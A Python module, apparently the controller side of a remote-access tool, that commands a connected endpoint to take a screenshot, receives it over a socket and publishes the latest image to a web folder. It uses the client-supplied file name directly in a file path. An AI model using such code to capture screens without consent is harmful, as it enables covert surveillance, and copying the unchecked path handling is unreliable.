import glob
from datetime import datetime
import os
from PIL import Image
import socket
import shutil

from Modules.logger import init_logger
from Modules.server import Server


class Screenshot:
    def __init__(self, path, log_path, endpoint, server, shell_target):
        self.images = []
        self.endpoint = endpoint
        self.path = path
        self.log_path = log_path
        self.server = server
        self.server_port = self.server.port
        self.shell_target = shell_target
        self.screenshot_path = os.path.join(self.path, self.endpoint.ident)
        self.logger = init_logger(self.log_path, __name__)

        self.server = server

    def bytes_to_number(self, b: int) -> int:
        res = 0
        for i in range(4):
            res += b[i] << (i * 8)
        return res

    def make_dir(self):
        try:
            os.makedirs(self.screenshot_path)

        except FileExistsError:
            self.logger.debug(f"{self.screenshot_path} Exists.")
            pass

    def get_file_name(self):
        try:
            self.filename = self.endpoint.conn.recv(1024)
            self.filename = str(self.filename).strip("b'")
            self.endpoint.conn.send("Filename OK".encode())
            self.screenshot_file_path = os.path.join(self.screenshot_path, self.filename)

        except (ConnectionError, socket.error) as e:
            self.logger.debug(f"Error: {e}")
            self.logger.debug(f"Calling remove_lost_connection({self.endpoint})...")
            self.server.remove_lost_connection(self.endpoint)
            return False

    def get_file_size(self):
        try:
            self.size = self.endpoint.conn.recv(4)
            # self.endpoint.conn.send("OK".encode())
            self.size = self.bytes_to_number(self.size)

        except (ConnectionError, socket.error) as e:
            self.logger.debug(f"Error: {e}")
            self.logger.debug(f"Calling remove_lost_connection({self.endpoint})...")
            self.server.remove_lost_connection(self.endpoint)
            return False

    def get_file_content(self):
        current_size = 0
        buffer = b""
        try:
            self.logger.debug(f"Opening {self.filename} for writing...")
            with open(self.screenshot_file_path, 'wb') as file:
                self.logger.debug(f"Fetching file content...")
                while current_size < self.size:
                    data = self.endpoint.conn.recv(1024)
                    if not data:
                        break

                    if len(data) + current_size > self.size:
                        data = data[:self.size - current_size]

                    buffer += data
                    current_size += len(data)
                    file.write(data)

            self.logger.info(f"get_file_content completed.")

        except FileExistsError:
            self.logger.debug(f"Passing file exists error...")
            pass

        except (WindowsError, socket.error) as e:
            self.logger.debug(f"Error: {e}")
            self.logger.debug(f"Calling remove_lost_connection({self.endpoint})...")
            self.server.remove_lost_connection(self.endpoint)
            return False

    def confirm(self):
        try:
            self.logger.debug(f"Waiting for answer from client...")
            self.ans = self.endpoint.conn.recv(1024).decode()
            self.logger.debug(f"{self.endpoint.ip}: {self.ans}")

        except (ConnectionError, socket.error) as e:
            self.logger.debug(f"Error: {e}.")
            self.logger.debug(f"Calling app.server.remove_lost_connection({self.endpoint})...")
            self.server.remove_lost_connection(self.endpoint)
            return False

    def finish(self):
        try:
            self.logger.debug(f"Sorting jpg files by creation time...")
            self.images = glob.glob(fr"{self.screenshot_path}\*.jpg")
            self.images.sort(key=os.path.getmtime)
            self.logger.debug(f"Opening latest screenshot...")
            self.sc = Image.open(self.images[-1])
            self.logger.debug(f"Resizing to 650x350...")
            self.sc_resized = self.sc.resize((650, 350))
            self.last_screenshot = os.path.basename(self.images[-1])
            self.last_sc_path = os.path.join(self.screenshot_path, self.last_screenshot)

            for endpoint in self.server.endpoints:
                if endpoint.conn == self.shell_target:
                    endpoint_ident = endpoint.ident
                    local_dir = create_local_dir(endpoint_ident)
                    src = os.path.join(self.screenshot_path, self.last_screenshot)
                    shutil.copy(src, local_dir)

            # os.startfile(self.last_sc_path)
            self.logger.info(f"Screenshot completed.")

        except IndexError:
            pass

    def run(self):
        self.logger.info(f"Running screenshot...")
        self.logger.debug(f"Calling make_dir...")
        self.make_dir()

        try:
            self.logger.debug(f"Sending screen command to client...")
            self.endpoint.conn.send('screen'.encode())

        except (ConnectionError, socket.error) as e:
            self.logger.debug(f"Error: {e}.")
            self.logger.debug(f"Calling remove_lost_connection({self.endpoint}...")
            self.server.remove_lost_connection(self.endpoint)
            return False

        self.logger.debug(f"Calling get_file_name...")
        self.get_file_name()
        self.logger.debug(f"Calling get_file_size...")
        self.get_file_size()
        self.logger.debug(f"Calling get_file_content...")
        self.get_file_content()
        self.finish()


def create_local_dir(endpoint_ident):
    local_dir = os.path.join('static', 'images', endpoint_ident)
    if not os.path.exists(local_dir):
        os.makedirs(local_dir)

    return local_dir
